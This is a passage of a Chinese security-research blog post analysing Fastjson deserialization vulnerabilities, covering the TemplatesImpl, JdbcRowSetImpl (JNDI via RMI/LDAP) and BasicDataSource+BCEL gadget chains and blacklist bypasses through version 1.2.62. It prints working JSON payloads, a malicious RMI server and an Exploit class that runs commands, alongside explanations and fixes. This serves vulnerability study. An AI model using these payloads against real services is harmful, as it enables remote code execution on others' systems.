+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(poctext, Object.class, <span class="keyword">new</span> <span class="title class_">ParserConfig</span>(), Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure>
+
+<h4 id="为什么需要对-bytecodes进行Base64编码"><a href="#为什么需要对-bytecodes进行Base64编码" class="headerlink" title="为什么需要对_bytecodes进行Base64编码"></a>为什么需要对_bytecodes进行Base64编码</h4><p>可以发现，在PoC中的_bytecodes字段是经过Base64编码的。为什么要怎么做呢？分析Fastjson对JSON字符串的解析过程，原理Fastjson提取byte[]数组字段值时会进行Base64解码，所以我们构造payload时需要对_bytecodes字段进行Base64加密处理。</p>
+<h4 id="为什么需要设置-tfactory为"><a href="#为什么需要设置-tfactory为" class="headerlink" title="为什么需要设置_tfactory为{}"></a>为什么需要设置_tfactory为{}</h4><p>在getTransletInstance()函数中调用了defineTransletClasses()函数，defineTransletClasses()函数是用于生成Java类的，在其中会新建一个转换类加载器，其中会调用到_tfactory.getExternalExtensionsMap()方法，若_tfactory为null则会导致这段代码报错、从而无法生成恶意类</p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>其实就是fastjson在反序列化时会调用TemplatesImpl的getOutputProperties()方法，从而加载到恶意类的Base64编码的字节数组。</p>
+<h2 id="基于JdbcRowSetImpl的利用链"><a href="#基于JdbcRowSetImpl的利用链" class="headerlink" title="基于JdbcRowSetImpl的利用链"></a>基于JdbcRowSetImpl的利用链</h2><h3 id="限制-1"><a href="#限制-1" class="headerlink" title="限制"></a>限制</h3><p>基于JdbcRowSetImpl的利用链主要有两种利用方式，即JNDI+RMI和JNDI+LDAP，都是属于基于Bean Property类型的JNDI的利用方式。</p>
+<p>由于是利用JNDI注入漏洞来触发的，因此主要的限制因素是JDK版本。</p>
+<p>基于RMI利用的JDK版本&lt;&#x3D;6u141、7u131、8u121，基于LDAP利用的JDK版本&lt;&#x3D;6u211、7u201、8u191。</p>
+<p>需要出网。</p>
+<h3 id="JNDI-RMI复现利用"><a href="#JNDI-RMI复现利用" class="headerlink" title="JNDI+RMI复现利用"></a>JNDI+RMI复现利用</h3><p>PoC如下，@type指向com.sun.rowset.JdbcRowSetImpl类，dataSourceName值为RMI服务中心绑定的Exploit服务，autoCommit有且必须为true或false等布尔值类型：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://localhost:1099/Exploit&quot;</span>, <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>JNDIServer.java，RMI服务，注册表绑定了Exploit服务，该服务是指向恶意Exploit.class文件所在服务器的Reference</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">//http://127.0.0.1:8000/Exploit.class即可</span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Exloit&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Exploit&quot;</span>,<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;Exploit&quot;</span>,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Exploit.java，恶意类，单独编译成class文件并放置于RMI服务指向的三方Web服务中，作为一个Factory绑定在注册表服务中：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String[] cmds = System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)</span><br><span class="line">                    ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;calc.exe&quot;</span>&#125;</span><br><span class="line">                    : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;touch /tmp/hacked&quot;</span>&#125;;</span><br><span class="line">            Runtime.getRuntime().exec(cmds);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Exploit</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Exploit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>漏洞代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImplPoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argv)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先运行JNDI的RMI服务，将恶意类Exploit.class单独放置于一个三方的Web服务中，然后运行PoC即可弹计算器，且看到访问了含有恶意类的Web服务。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732696623586-35f05d8e-6341-4fa7-82c2-0ecaf60317e8.png"></p>
+<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>在<strong>JdbcRowSetImpl</strong>中的setDataSourceName()和setAutoCommit()函数都会被调用，setDataSourceName()函数，将dataSourceName值设置为目标RMI服务的地址，</p>
+<p>setAutoCommit()函数，设置autoCommit值，其中调用了connect()函数。</p>
+<p>跟进connect()函数，看到了熟悉的JNDI注入的代码即<strong>InitialContext.lookup()</strong>，并且其参数是调用this.getDataSourceName()获取的、即在前面setDataSourceName()函数中设置的值，因此lookup参数外部可控，导致存在JNDI注入漏洞。</p>
+<h2 id="BasicDataSource-BCEL-ClassLoader"><a href="#BasicDataSource-BCEL-ClassLoader" class="headerlink" title="BasicDataSource+BCEL ClassLoader"></a>BasicDataSource+BCEL ClassLoader</h2><h3 id="限制-2"><a href="#限制-2" class="headerlink" title="限制"></a>限制</h3><p><font style="color:rgba(34, 34, 34, 0.8);">依赖包 tomcat-dbcp 使用也比较广泛，是Tomcat的数据库驱动组件</font></p>
+<p>直接传入字节码不需要出网就可执行恶意代码但是需要引入tomcat的依赖</p>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 目标是 JSON.parse()</span></span><br><span class="line">&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;x&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,</span><br><span class="line">                <span class="string">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;driverClassName&quot;</span>: <span class="string">&quot;$$BCEL$$$l$8b$I$A$...&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;: <span class="string">&quot;x&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 目标是JSON.parseObject()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,</span><br><span class="line">        <span class="string">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;driverClassName&quot;</span>: <span class="string">&quot;$$BCEL$$$l$8b......&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>driverClassName里面传入的其实是恶意类经过BCEL协议编码过后的代码。</p>
+<h3 id="BasicDataSource"><a href="#BasicDataSource" class="headerlink" title="BasicDataSource"></a>BasicDataSource</h3><p>BasicDataSource的toString()方法会遍历这个类的所有getter并执行，于是通过getConnection()-&gt;createDataSource()-&gt;createConnectionFactory()的调用关系，调用到了createConnectionFactory方法。</p>
+<p>在createConnectionFactory方法中，调用了Class.forName(driverClassName, true, driverClassLoader)。Class.forName第二个参数initial为true时，类加载后将会直接执行static{}块中的代码。</p>
+<p>因为driverClassLoader和driverClassName都可以通过fastjson控制，所以只要找到一个可以利用的恶意类即可。</p>
+<p>BCEL ClassLoader闪亮登场。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1735638660961-a4b3956d-fa49-4985-bdbf-6c7b72d0f930.png"></p>
+<h3 id="BCEL-ClassLoader"><a href="#BCEL-ClassLoader" class="headerlink" title="BCEL ClassLoader"></a>BCEL ClassLoader</h3><p>BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，但其因为</p>
+<p>被Apache Xalan所使用，而Apache Xalan又是Java内部对于JAXP的实现，所以BCEL也被包含在了JDK的</p>
+<p>原生库中。</p>
+<p>com.sun.org.apache.bcel.internal.util.ClassLoader;</p>
+<p>BCEL ClassLoader用于加载BCEL和格式的“字节码”，并可以执行其中的代码。</p>
+<p>这是一个神奇的 ClassLoader，因为它会直接从 classname 中提取 Class 的 bytecode 数据。</p>
+<p>如果 classname 中包含 $$BCEL$$ ，这个 ClassLoader 则会将$$BCEL$$后面的字符串按照BCEL编码进行解码，作为Class的字节码，并调用 defineClass() 获取 Class 对象。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1735638985993-3724ab80-0b6b-44c4-92c3-c452eebef26a.png"></p>
+<p>BCEL ClassLoader在Fastjson等漏洞的利用链构造时都有被用到，其实这个类和前面的</p>
+<p>TemplatesImpl都出自于同一个第三方库，Apache Xalan。但是由于各种原因（详见前面所说的</p>
+<p>《BCEL ClassLoader去哪了》），在Java 8u251的更新中，这个ClassLoader被移除了。</p>
+<h3 id="JSONObject触发toString"><a href="#JSONObject触发toString" class="headerlink" title="JSONObject触发toString()"></a>JSONObject触发toString()</h3><p>首先，在 {“@type”: “org.apache.tomcat.dbcp.dbcp2.BasicDataSource”……} 这一整段外面再套一层{}，反序列化生成一个 JSONObject 对象。</p>
+<p>然后，将这个 JSONObject 放在 JSON Key 的位置上，在 JSON 反序列化的时候，FastJson 会对 JSON Key 自动调用 toString() 方法。</p>
+<p>当然，如果目标环境的开发者代码中是调用的是 JSON.parseObject() ，那就不用这么麻烦了。与 parse() 相比，parseObject() 会额外的将 Java 对象转为 JSONObject 对象，即调用 JSON.toJSON()，在处理过程中会调用所有的 setter 和 getter 方法。</p>
+<p>所以对于 JSON.parseObject()，不用外面多包一层。</p>
+<h1 id="版本差异"><a href="#版本差异" class="headerlink" title="版本差异"></a>版本差异</h1><h2 id="1-2-22-1-2-24"><a href="#1-2-22-1-2-24" class="headerlink" title="1.2.22-1.2.24"></a>1.2.22-1.2.24</h2><h3 id="JdbcRowSetImpl-Poc"><a href="#JdbcRowSetImpl-Poc" class="headerlink" title="JdbcRowSetImpl Poc"></a>JdbcRowSetImpl Poc</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&#123;&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>将DefaultJSONParser.parseObject()函数中的TypeUtils.loadClass替换为checkAutoType()函数</p>
+<p>checkAutoType()函数就是使用黑白名单的方式对反序列化的类型继续过滤，acceptList为白名单（默认为空，可手动添加），denyList为黑名单（默认不为空）。</p>
+<p>autoTypeSupport为False，不支持自动类型转换，只能加载白名单上的类。</p>
+<p>autoTypeSupport为True，支持自动类型转换，只要不在黑名单上都能被加载。</p>
+<p>默认情况下autoTypeSupport为false。</p>
+<h2 id="1-2-25-1-2-41绕过"><a href="#1-2-25-1-2-41绕过" class="headerlink" title="1.2.25-1.2.41绕过"></a>1.2.25-1.2.41绕过</h2><p>在1.2.24之后的版本中，使用了checkAutoType()函数，通过黑白名单的方式来防御Fastjson反序列化漏洞，因此后面发现的Fastjson反序列化漏洞都是针对黑名单的绕过来实现攻击利用的。</p>
+<p>本篇文章讲的历史补丁版本绕过的利用，都必须开启AutoTypeSupport才能成功。</p>
+<h4 id="JdbcRowSetImpl-Poc-1"><a href="#JdbcRowSetImpl-Poc-1" class="headerlink" title="JdbcRowSetImpl Poc"></a>JdbcRowSetImpl Poc</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>, <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h4><p>类名的前面加”L”、后面加了”;”</p>
+<h4 id="原因："><a href="#原因：" class="headerlink" title="原因："></a>原因：</h4><p>checkAutoType()函数中，”Lcom.sun.rowset.JdbcRowSetImpl;”类名由于是以”L”开头，因此并不在denyList黑名单中，从而绕过了黑名单校验，再往下开始调用TypeUtils.loadClass()。</p>
+<p>TypeUtils.loadClass()函数，这里我们在之前的文章中年已经调试分析过了，，就是会有个判断条件判断类名是否以”L”开头、以”;”结尾，是的话就提取出其中的类名再加载进来，因此能成功绕过</p>
+<h2 id="1-2-25-1-2-42绕过"><a href="#1-2-25-1-2-42绕过" class="headerlink" title="1.2.25-1.2.42绕过"></a>1.2.25-1.2.42绕过</h2><p>在1.2.41中L;的方法测试可以，1.2.42中不行。</p>
+<h4 id="哈希黑名单"><a href="#哈希黑名单" class="headerlink" title="哈希黑名单"></a>哈希黑名单</h4><p>从1.2.42版本开始，Fastjson把原本明文形式的黑名单改成了哈希过的黑名单<a target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></p>
+<h4 id="1-2-25-1-2-41的修复"><a href="#1-2-25-1-2-41的修复" class="headerlink" title="1.2.25-1.2.41的修复"></a>1.2.25-1.2.41的修复</h4><p>checkAutoType()函数中，会对”L”开头和”;”结尾的类名进行一次提取操作。</p>
+<h4 id="JdbcRowSetImpl-Poc-2"><a href="#JdbcRowSetImpl-Poc-2" class="headerlink" title="JdbcRowSetImpl Poc"></a>JdbcRowSetImpl Poc</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>, <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="绕过方式-1"><a href="#绕过方式-1" class="headerlink" title="绕过方式"></a>绕过方式</h4><p>类名的前面加了”LL”、后面加了”;;”</p>
+<h4 id="原因：-1"><a href="#原因：-1" class="headerlink" title="原因："></a>原因：</h4><p>后面调用TypeUtils.loadClass()函数时，传入的是我们输入的LLcom.sun.rowset.JdbcRowSetImpl;;</p>
+<p>为何添加了两次的类名也能成功触发呢？我们跟进TypeUtils.loadClass()函数中可以发现，在”L”和”;”之间提取出类名后，会再次调用自身函数loadClass()，也就是说只要检测出”L”开头和”;”结尾的字符都会调用自身来循环提取出真正的类名。</p>
+<h2 id="1-2-25-1-2-45绕过"><a href="#1-2-25-1-2-45绕过" class="headerlink" title="1.2.25-1.2.45绕过"></a>1.2.25-1.2.45绕过</h2><p>绕过利用</p>
+<p>前提条件：需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列&lt;3.5.0的版本。</p>
+<p>直接给出payload，要连LDAP或RMI都可以：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,<span class="string">&quot;properties&quot;</span>:&#123;<span class="string">&quot;data_source&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>主要就是黑名单绕过，这个类我们在哈希黑名单中1.2.46的版本中才被加入黑名单。</p>
+<h4 id="JndiDataSourceFactory"><a href="#JndiDataSourceFactory" class="headerlink" title="JndiDataSourceFactory"></a>JndiDataSourceFactory</h4><p>利用的是JndiDataSourceFactory.setProperties()方法，这个方法中调用了InitialContext.lookup()，存在JNDI注入。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732707881065-262905f6-a821-4fb7-850b-774f5c71f2df.png"></p>
+<h2 id="1-2-25-1-2-47绕过"><a href="#1-2-25-1-2-47绕过" class="headerlink" title="1.2.25-1.2.47绕过"></a>1.2.25-1.2.47绕过</h2><p>无需开启AutoType</p>
+<h3 id="限制-3"><a href="#限制-3" class="headerlink" title="限制"></a>限制</h3><p>主要是JDK版本对于JDNI注入的限制，基于RMI利用的JDK版本&lt;&#x3D;6u141、7u131、8u121，基于LDAP利用的JDK版本&lt;&#x3D;6u211、7u201、8u191。</p>
+<h3 id="Poc-1"><a href="#Poc-1" class="headerlink" title="Poc"></a>Poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>实际上还是利用了com.sun.rowset.JdbcRowSetImpl这条利用链来攻击利用的，因此除了JDK版本外几乎没有限制。</p>
+<p>但是如果目标服务端开启了AutoTypeSupport呢？经测试发现：</p>
+<p>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；</p>
+<p>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；</p>
+<h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>在TypeUtils的static初始化时调用com.alibaba.fastjson.util.TypeUtils#addBaseClassMappings中会将常用的类通过loadclass()放入mapping中。</p>
+<p>在第一次扫描解析中，由于@type执行java.lang.Class类，该类在接下来的deserializers.findClass()函数中直接被找到，判断clazz是否为Class类，是的话调用TypeUtils.loadClass()在TypeUtils.loadClass()函数中，成功加载com.sun.rowset.JdbcRowSetImpl类后，就会将其缓存在Map中。</p>
+<p>在扫描第二部分的JSON数据时，由于前面第一部分JSON数据中的val键值”com.sun.rowset.JdbcRowSetImpl”已经缓存到Map中了，所以当此时调用TypeUtils.getClassFromMapping()时能够成功从Map中获取到缓存的类，进而在下面的判断clazz是否为空的if语句中直接return返回了，从而成功绕过checkAutoType()检测。</p>
+<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>1.2.48中的修复措施是，在loadClass()时，将缓存开关默认置为False，所以默认是不能通过Class加载进缓存Map了。同时将Class类加入到了黑名单中。</p>
+<h2 id="1-2-62绕过"><a href="#1-2-62绕过" class="headerlink" title="1.2.62绕过"></a>1.2.62绕过</h2><p>新Gadget绕过黑名单限制。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="string">&quot;AsText&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>org.apache.xbean.propertyeditor.JndiConverter类的toObjectImpl()函数存在JNDI注入漏洞，可由其构造函数处触发利用。</p>
+<p>前提条件</p>
+<ul>
+<li>需要开启AutoType；</li>
+<li>Fastjson &lt;&#x3D; 1.2.62；</li>
+<li>JNDI注入利用所受的JDK版本限制；</li>
+<li>目标服务端需要存在xbean-reflect包；</li>
+</ul>
+<p>参考链接：<a target="_blank" rel="noopener" href="http://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">http://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/01/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="cm5l7vlhr0005fscx88esb7ji" data-title="C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\Fastjson反序列化" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2025/01/07/Apache%20OFBiz%20XML-RPC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\Apache OFBiz XML-RPC漏洞分析
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2025/01/07/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\Jackson反序列化</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">安全研究</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/">Java安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">反序列化漏洞</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">注入漏洞</a></li></ul></li></ul></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" rel="tag">注入漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
